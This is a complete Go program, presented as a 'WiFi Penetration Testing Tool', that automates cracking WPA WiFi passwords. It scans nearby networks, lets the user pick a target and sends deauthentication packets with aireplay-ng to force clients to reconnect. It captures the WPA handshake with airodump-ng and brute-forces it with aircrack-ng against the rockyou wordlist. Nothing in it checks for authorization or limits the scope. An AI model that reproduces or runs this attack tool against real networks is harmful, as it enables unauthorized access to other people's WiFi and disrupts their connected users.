package main

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Constants
const (
	defaultWordlistPath = "/usr/share/wordlists/rockyou.txt"
	deauthPacketCount   = 10
	scanUpdateInterval  = 1 * time.Second
	monitorStartDelay   = 2 * time.Second
)

// Network represents a WiFi network
type Network struct {
	ID      int
	BSSID   string
	ESSID   string
	Channel string
	Signal  string
}

// Config holds configuration values
type Config struct {
	WordlistPath string
	DeauthCount  int
}

func main() {
	fmt.Println(`
╔══════════════════════════════════════════════╗
║    WiFi Penetration Testing Tool            ║
║    Created with Go                          ║
╚══════════════════════════════════════════════╝
	`)

	// Setup signal handler for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n[!] Interrupt received, cleaning up...")
		cancel()
	}()

	config := &Config{
		WordlistPath: getEnvOrDefault("WORDLIST_PATH", defaultWordlistPath),
		DeauthCount:  deauthPacketCount,
	}

	// Check if running as root
	if os.Geteuid() != 0 {
		log.Fatal("[-] This program must be run with sudo/root privileges")
	}

	var monitorInterface string
	var captureFile string

	// Ensure cleanup on exit
	defer func() {
		if monitorInterface != "" {
			stopMonitorMode(monitorInterface)
		}
	}()

	// Step 1: Kill conflicting processes
	if err := killConflictingProcesses(); err != nil {
		log.Printf("[-] Warning: Error killing processes: %v", err)
	}

	// Step 2: Get available interfaces
	interfaceName, err := selectInterface()
	if err != nil {
		log.Fatalf("[-] Failed to select interface: %v", err)
	}
	if interfaceName == "" {
		log.Fatal("[-] No interface selected. Exiting.")
	}

	// Step 3: Enable monitor mode
	var err2 error
	monitorInterface, err2 = enableMonitorMode(interfaceName)
	if err2 != nil {
		log.Fatalf("[-] Failed to enable monitor mode: %v", err2)
	}

	// Step 4: Scan for networks
	fmt.Println("\n[+] Scanning for networks...")
	networks, err := scanNetworks(ctx, monitorInterface)
	if err != nil {
		log.Fatalf("[-] Failed to scan networks: %v", err)
	}
	if len(networks) == 0 {
		log.Fatal("[-] No networks found. Exiting.")
	}

	// Step 5: Select target network
	targetNetwork, err := selectTargetNetwork(networks)
	if err != nil {
		log.Fatalf("[-] Failed to select target: %v", err)
	}

	// Step 6: Capture handshake
	fmt.Printf("\n[+] Targeting network: %s (%s)\n", targetNetwork.ESSID, targetNetwork.BSSID)
	captureFile, err = captureHandshake(ctx, monitorInterface, targetNetwork, config)
	if err != nil {
		log.Fatalf("[-] Failed to capture handshake: %v", err)
	}

	// Step 7: Stop monitor mode
	if err := stopMonitorMode(monitorInterface); err != nil {
		log.Printf("[-] Warning: Error stopping monitor mode: %v", err)
	}
	monitorInterface = "" // Prevent cleanup in defer

	// Step 8: Crack password
	fmt.Println("\n[+] Attempting to crack password...")
	if err := crackPassword(captureFile, config); err != nil {
		log.Printf("[-] Cracking failed: %v", err)
	}

	fmt.Println("\n[+] Process completed!")
}

func getEnvOrDefault(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}

func killConflictingProcesses() error {
	fmt.Println("[+] Checking for conflicting processes...")

	cmd := exec.Command("sudo", "airmon-ng", "check", "kill")
	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("error killing processes: %w", err)
	}

	time.Sleep(monitorStartDelay)
	fmt.Println("[✓] Conflicting processes terminated")
	return nil
}

func selectInterface() (string, error) {
	fmt.Println("\n[+] Available network interfaces:")

	cmd := exec.Command("iwconfig")
	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("error getting interfaces: %w", err)
	}

	lines := strings.Split(string(output), "\n")
	var interfaces []string

	for _, line := range lines {
		if strings.Contains(line, "IEEE 802.11") && !strings.Contains(line, "no wireless") {
			parts := strings.Fields(line)
			if len(parts) > 0 {
				interfaces = append(interfaces, parts[0])
			}
		}
	}

	if len(interfaces) == 0 {
		fmt.Println("[-] No wireless interfaces found")
		return "", nil
	}

	for i, iface := range interfaces {
		fmt.Printf("  %d. %s\n", i+1, iface)
	}

	fmt.Print("\nSelect interface number: ")
	reader := bufio.NewReader(os.Stdin)
	input, err := reader.ReadString('\n')
	if err != nil {
		return "", fmt.Errorf("failed to read input: %w", err)
	}
	input = strings.TrimSpace(input)

	choice, err := strconv.Atoi(input)
	if err != nil || choice < 1 || choice > len(interfaces) {
		fmt.Println("[-] Invalid selection")
		return "", fmt.Errorf("invalid selection: %d", choice)
	}

	return interfaces[choice-1], nil
}

func enableMonitorMode(interfaceName string) (string, error) {
	fmt.Printf("\n[+] Enabling monitor mode on %s...\n", interfaceName)

	cmd := exec.Command("sudo", "airmon-ng", "start", interfaceName)
	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("error enabling monitor mode: %w", err)
	}

	time.Sleep(monitorStartDelay)

	// Check if interface name changed to *mon
	monName := interfaceName + "mon"

	// Quick check if mon exists
	cmdCheck := exec.Command("iwconfig", monName)
	if err := cmdCheck.Run(); err == nil {
		fmt.Printf("[✓] Monitor mode enabled on %s\n", monName)
		return monName, nil
	}

	// Fallback to original
	fmt.Printf("[✓] Monitor mode enabled on %s (name unchanged)\n", interfaceName)
	return interfaceName, nil
}

func scanNetworks(ctx context.Context, monitorInterface string) ([]Network, error) {
	fmt.Println("\n[+] Scanning networks...")
	fmt.Println("[i] Press 's' and Enter to stop scanning when ready")

	// Local file prefix
	cwd, err := os.Getwd()
	if err != nil {
		return nil, fmt.Errorf("failed to get working directory: %w", err)
	}
	tmpPrefix := cwd + "/list"
	csvFile := tmpPrefix + "-01.csv"

	// Cleanup previous scans
	files, _ := os.ReadDir(cwd)
	for _, f := range files {
		if strings.HasPrefix(f.Name(), "list-") {
			os.Remove(f.Name())
		}
	}

	// Run airodump-ng in background, outputting to CSV
	cmd := exec.CommandContext(ctx, "sudo", "airodump-ng",
		"--output-format", "csv",
		"-w", tmpPrefix,
		"--write-interval", "1",
		monitorInterface)

	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))

	// Capture stderr to debug startup failures
	var stderr bytes.Buffer
	cmd.Stdout = nil
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("error starting scan: %w", err)
	}

	// Ensure process is killed on exit
	defer func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}()

	// UI Updater Goroutine
	stopUI := make(chan bool)
	go func() {
		ticker := time.NewTicker(scanUpdateInterval)
		defer ticker.Stop()
		for {
			select {
			case <-stopUI:
				return
			case <-ctx.Done():
				return
			case <-ticker.C:
				// Clear screen
				fmt.Print("\033[H\033[2J")
				fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
				fmt.Println("\n[+] Scanning networks... (Press 's' and Enter to stop)")

				// Check process state
				if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
					fmt.Println("[-] Scanner process died unexpectedly:")
					fmt.Println(stderr.String())
					return
				}

				// Check file existence
				if _, err := os.Stat(csvFile); os.IsNotExist(err) {
					fmt.Printf("[*] Waiting for scan file (%s)...\n", csvFile)
					if stderr.Len() > 0 {
						fmt.Printf("Debug output: %s\n", stderr.String())
					}
				} else {
					// Try to parse CSV
					currentNetworks, err := parseAirodumpCSV(csvFile)
					if err != nil {
						fmt.Printf("[!] Error parsing CSV: %v\n", err)
					} else if len(currentNetworks) == 0 {
						fmt.Println("[*] File found, but no networks parsed yet...")
					} else {
						printNetworkTable(currentNetworks)
					}
				}
				fmt.Print("\n> ") // Input prompt
			}
		}
	}()

	// Wait for user input to stop or context cancellation
	done := make(chan bool)
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			text := strings.TrimSpace(scanner.Text())
			if text == "s" || text == "S" {
				done <- true
				return
			}
		}
	}()

	select {
	case <-done:
		// User requested stop
	case <-ctx.Done():
		// Context cancelled
		return nil, ctx.Err()
	}

	// Stop UI updater
	stopUI <- true
	time.Sleep(500 * time.Millisecond)

	// Kill the process (already handled by defer, but explicit for clarity)
	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}

	// Parse the final CSV
	networks, err := parseAirodumpCSV(csvFile)
	if err != nil {
		return nil, fmt.Errorf("error parsing scan results (%s): %w", csvFile, err)
	}

	// Cleanup
	os.Remove(csvFile)

	return networks, nil
}

func printNetworkTable(networks []Network) {
	fmt.Println("┌────┬────────────────────┬──────────────┬─────────┬────────┐")
	fmt.Println("│ ID │ BSSID              │ ESSID        │ Channel │ Signal │")
	fmt.Println("├────┼────────────────────┼──────────────┼─────────┼────────┤")

	for _, net := range networks {
		// Truncate ESSID if too long
		essid := net.ESSID
		if len(essid) > 12 {
			essid = essid[:12]
		}
		fmt.Printf("│ %2d │ %17s │ %-12s │ %7s │ %6s │\n",
			net.ID, net.BSSID, essid, net.Channel, net.Signal)
	}
	fmt.Println("└────┴────────────────────┴──────────────┴─────────┴────────┘")
}

func parseAirodumpCSV(filename string) ([]Network, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	var networks []Network
	scanner := bufio.NewScanner(file)

	idCounter := 1
	hasHeader := false

	for scanner.Scan() {
		line := scanner.Text()

		// Section separator check
		if strings.TrimSpace(line) == "" || strings.HasPrefix(line, "Station MAC") {
			if len(networks) > 0 {
				break // Stop processing when we hit clients section
			}
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}

		// Clean tokens
		for i := range parts {
			parts[i] = strings.TrimSpace(parts[i])
		}

		if parts[0] == "BSSID" {
			hasHeader = true
			continue
		}

		if !hasHeader {
			continue // Skip until we find header
		}

		// Parse fields
		bssid := parts[0]
		channel := parts[3]
		signal := parts[8]
		essid := parts[13]

		// Filter out empty lines or invalid rows
		if bssid == "" || essid == "" {
			continue
		}

		// Validate BSSID format (basic check)
		if !isValidBSSID(bssid) {
			continue
		}

		networks = append(networks, Network{
			ID:      idCounter,
			BSSID:   bssid,
			ESSID:   essid,
			Channel: channel,
			Signal:  signal,
		})
		idCounter++
	}

	if err := scanner.Err(); err != nil {
		return networks, fmt.Errorf("error reading file: %w", err)
	}

	return networks, nil
}

func isValidBSSID(bssid string) bool {
	// Basic BSSID format validation: XX:XX:XX:XX:XX:XX
	parts := strings.Split(bssid, ":")
	if len(parts) != 6 {
		return false
	}
	for _, part := range parts {
		if len(part) != 2 {
			return false
		}
		// Check if hex
		if _, err := strconv.ParseUint(part, 16, 8); err != nil {
			return false
		}
	}
	return true
}

func selectTargetNetwork(networks []Network) (Network, error) {
	fmt.Println("\n[+] Available Networks:")
	printNetworkTable(networks)

	fmt.Print("\nSelect target network ID: ")
	reader := bufio.NewReader(os.Stdin)
	input, err := reader.ReadString('\n')
	if err != nil {
		return Network{}, fmt.Errorf("failed to read input: %w", err)
	}
	input = strings.TrimSpace(input)

	choice, err := strconv.Atoi(input)
	if err != nil || choice < 1 || choice > len(networks) {
		return Network{}, fmt.Errorf("invalid network selection: %d", choice)
	}

	return networks[choice-1], nil
}

func captureHandshake(ctx context.Context, monitorInterface string, target Network, config *Config) (string, error) {
	captureFile := "handshake_capture"
	channel := target.Channel
	if channel == "" {
		channel = "1"
	}

	fmt.Printf("\n[+] Capturing handshake on channel %s...\n", channel)
	fmt.Println("[!] Wait for handshake capture or press Ctrl+C when WPA handshake appears")

	// Start capture in background
	cmd := exec.CommandContext(ctx, "sudo", "airodump-ng",
		"-w", captureFile,
		"-c", channel,
		"--bssid", target.BSSID,
		monitorInterface)

	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	// Ensure process cleanup
	defer func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}()

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start capture: %w", err)
	}

	// Start concurrent deauth attack
	deauthDone := make(chan error, 1)
	go func() {
		// Wait a moment for airodump to start and switch channel
		time.Sleep(monitorStartDelay)
		fmt.Println("\n[+] Starting concurrent deauth attack...")
		// Send deauth packets
		if err := deauthClients(monitorInterface, target.BSSID, config.DeauthCount); err != nil {
			deauthDone <- err
			return
		}
		// Maybe retry a few times if needed?
		time.Sleep(5 * time.Second)
		if err := deauthClients(monitorInterface, target.BSSID, config.DeauthCount); err != nil {
			deauthDone <- err
			return
		}
		deauthDone <- nil
	}()

	// Wait for user to see handshake or context cancellation
	done := make(chan bool, 1)
	go func() {
		fmt.Println("\nPress Enter when WPA handshake is captured...")
		reader := bufio.NewReader(os.Stdin)
		_, _ = reader.ReadString('\n')
		done <- true
	}()

	select {
	case <-done:
		// User confirmed handshake captured
	case <-ctx.Done():
		return "", ctx.Err()
	case err := <-deauthDone:
		if err != nil {
			log.Printf("[-] Warning: Deauth error: %v", err)
		}
	}

	// Kill capture process
	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}

	capFileName := captureFile + "-01.cap"
	if _, err := os.Stat(capFileName); os.IsNotExist(err) {
		return "", fmt.Errorf("capture file not found: %s", capFileName)
	}

	return capFileName, nil
}

func deauthClients(monitorInterface, bssid string, count int) error {
	cmd := exec.Command("sudo", "aireplay-ng",
		"--deauth", strconv.Itoa(count),
		"-a", bssid,
		monitorInterface)

	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("deauth error: %w", err)
	}
	fmt.Printf("[✓] Sent %d deauth packets\n", count)
	return nil
}

func stopMonitorMode(monitorInterface string) error {
	fmt.Println("\n[+] Stopping monitor mode...")

	cmd := exec.Command("sudo", "airmon-ng", "stop", monitorInterface)
	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("error stopping monitor mode: %w", err)
	}
	fmt.Println("[✓] Monitor mode stopped")

	// Restart NetworkManager
	fmt.Println("[+] Restarting NetworkManager...")
	cmd = exec.Command("sudo", "systemctl", "start", "NetworkManager")
	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("error starting NetworkManager: %w", err)
	}
	fmt.Println("[✓] NetworkManager restarted")
	return nil
}

func crackPassword(capFile string, config *Config) error {
	wordlist := config.WordlistPath

	// Check if rockyou is gzipped
	if _, err := os.Stat(wordlist + ".gz"); err == nil {
		fmt.Println("[+] Found gzipped rockyou.txt, extracting...")
		cmd := exec.Command("gunzip", "-k", wordlist+".gz")
		fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("error extracting wordlist: %w", err)
		}
	}

	if _, err := os.Stat(wordlist); os.IsNotExist(err) {
		return fmt.Errorf("wordlist not found at %s. Install it with: sudo apt install wordlists", wordlist)
	}

	if _, err := os.Stat(capFile); os.IsNotExist(err) {
		return fmt.Errorf("capture file %s not found", capFile)
	}

	fmt.Println("\n[+] Starting password crack...")
	fmt.Println("    This may take a while depending on wordlist size")
	fmt.Println("    Press Ctrl+C to abort\n")

	cmd := exec.Command("sudo", "aircrack-ng",
		capFile,
		"-w", wordlist)

	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("cracking error: %w", err)
	}
	return nil
}
